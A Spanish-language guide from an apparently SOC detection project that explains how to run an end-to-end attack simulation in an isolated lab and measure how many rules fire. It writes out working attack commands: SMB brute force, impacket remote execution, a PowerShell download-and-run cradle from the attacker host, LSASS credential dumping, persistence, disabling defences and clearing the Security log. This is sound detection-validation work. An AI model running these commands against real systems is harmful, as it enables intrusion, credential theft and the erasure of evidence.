# Medir la detección con una simulación de ataque

La guía [MEDIR_FALSOS_POSITIVOS.md](MEDIR_FALSOS_POSITIVOS.md) mide el ruido sobre actividad legítima; OTRF ([VALIDACION.md](VALIDACION.md),
sección 6) mide la detección sobre datos de terceros. Esta guía cierra el círculo: ejecuta un ataque real de principio a fin **en tu propio
laboratorio** y mide cuánto detecta la app, con la misma herramienta (`backend.medicion_fp`).

> **Solo en un laboratorio aislado y propio.** Estas acciones son ofensivas: lanzarlas contra equipos que no son tuyos, o en una red de
> producción, es ilegal. El objetivo es medir *detección*, no causar daño. Todo se revierte en la limpieza (sección 5).

La guía usa el laboratorio del proyecto: un **Windows 10** con Sysmon y el agente de Wazuh (el equipo objetivo, `WIN10`/`IP-WIN10` en los
ejemplos) y una **Kali** como atacante (`IP-KALI`). Cambia esos marcadores por tus valores reales.

## 1. Requisitos

En el Windows, los mismos de la guía de falsos positivos (auditoría de 4688 con línea de comandos, 5145, Sysmon y el agente que no descarta
el 5145). En Kali: `impacket` y `netexec` (vienen en Kali reciente; si no, `sudo apt install -y impacket-scripts netexec`).

Para medir la *detección* (no la *prevención*), hay que dejar que el ataque se ejecute. Por eso, **en el laboratorio**, antes de empezar:

- Desactiva Windows Defender (**Protección contra alteraciones** primero, luego **Protección en tiempo real**), si no, borra las herramientas
  antes de que corran. Anota si Defender las detecta: es una capa de prevención real que vale la pena documentar.
- El movimiento lateral con una **cuenta local** necesita `LocalAccountTokenFilterPolicy=1` (Windows filtra el token de las cuentas locales
  por red). Se revierte en la limpieza.

## 2. Preparación (en el Windows, consola como administrador)

Cuenta de prueba, para no usar una cuenta real y que la medición no se mezcle con la actividad legítima:
```
net user atacante.prueba Password123! /add
```
```
net localgroup Administradores atacante.prueba /add
```
Firewall abierto solo para la Kali (SMB, WinRM y, para DCOM, RPC):
```
netsh advfirewall firewall add rule name="Pentest desde Kali" dir=in action=allow protocol=TCP localport=445,5985 remoteip=IP-KALI
```
```
netsh advfirewall firewall add rule name="Pentest DCOM" dir=in action=allow protocol=TCP localport=135,49152-65535 remoteip=IP-KALI
```
Token remoto para la cuenta local y sin bloqueo de cuenta (para que la fuerza bruta no la bloquee a mitad):
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
```
net accounts /lockoutthreshold:0
```
**Anota la hora de inicio.**

## 3. El ataque (desde Kali)

### 3.1 Acceso inicial
Reconocimiento (no genera eventos en el Windows; confirma puertos):
```
nmap -Pn -p139,445,3389,5985 IP-WIN10
```
Fuerza bruta por SMB, con una lista corta y la contraseña real al final:
```
printf '123456\npassword\nadmin123\nqwerty\nletmein\nwinter2025\nP@ssw0rd\nabc123\ntoor\nsoporte\nPassw0rd1\nPassword123!\n' > /tmp/pass.txt
```
```
nxc smb IP-WIN10 -u atacante.prueba -p /tmp/pass.txt
```

### 3.2 Ejecución remota (cuatro técnicas, cada una activa una regla distinta)
```
impacket-psexec atacante.prueba:'Password123!'@IP-WIN10
```
```
impacket-smbexec atacante.prueba:'Password123!'@IP-WIN10
```
```
impacket-wmiexec atacante.prueba:'Password123!'@IP-WIN10
```
```
impacket-dcomexec -object MMC20 atacante.prueba:'Password123!'@IP-WIN10 "whoami"
```

### 3.3 Post-explotación (en la shell de PsExec, que corre como SYSTEM)
Reconocimiento:
```
whoami /all & net user & net localgroup administradores & systeminfo & ipconfig /all & net share
```
PowerShell codificado y descarga de código:
```
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=
```
```
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://IP-KALI:8000/x.ps1')"
```
Volcado de LSASS (saca el PID con `tasklist | findstr lsass` y reemplázalo):
```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```
Persistencia:
```
schtasks /create /tn "WindowsUpdateHelper" /tr "C:\ProgramData\upd.exe" /sc onlogon /ru SYSTEM /f
```
```
sc create WinUpdateSvc binPath= "cmd /c C:\ProgramData\upd.exe" start= auto
```
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "C:\ProgramData\upd.exe" /f
```
Evasión (al final; el log ya se envió al Indexer en tiempo real):
```
netsh advfirewall set allprofiles state off
```
```
wevtutil cl Security
```
**Anota la hora de fin.**

## 4. Medición
En el Ubuntu Server, sobre la ventana del ataque:
```
sudo docker exec soc-incident-analyzer-analyzer-1 python -m backend.medicion_fp --agente WIN10 --desde INICIO --hasta FIN --etiqueta "simulacion de ataque" --procesos
```
No hace falta repetir el ataque para volver a medir: los eventos quedan en el Indexer; la herramienta solo los lee.

## 5. Limpieza (en el Windows, consola como administrador)
```
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 0 /f
```
```
netsh advfirewall firewall delete rule name="Pentest desde Kali"
```
```
netsh advfirewall firewall delete rule name="Pentest DCOM"
```
```
netsh advfirewall set allprofiles state on
```
```
schtasks /delete /tn "WindowsUpdateHelper" /f
```
```
sc delete WinUpdateSvc
```
```
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /f
```
```
del C:\Windows\Temp\lsass.dmp
```
```
net user atacante.prueba /delete
```
Y volvé a activar Windows Defender (tiempo real y protección contra alteraciones) desde Seguridad de Windows.

## 6. Qué se espera detectar
Resultados de la última corrida en [VALIDACION.md](VALIDACION.md), sección 3.2: 14 reglas distintas, de `brute_force` a `cmd_cred_dump`.
Lo que no se dispara (y por qué) también está documentado: `lateral` por nombre de equipo (el atacante es Linux), `cred_lsass` por Sysmon
(si no se audita el acceso a procesos), y `cred_dcsync`/`kerberoast` (hace falta Active Directory).
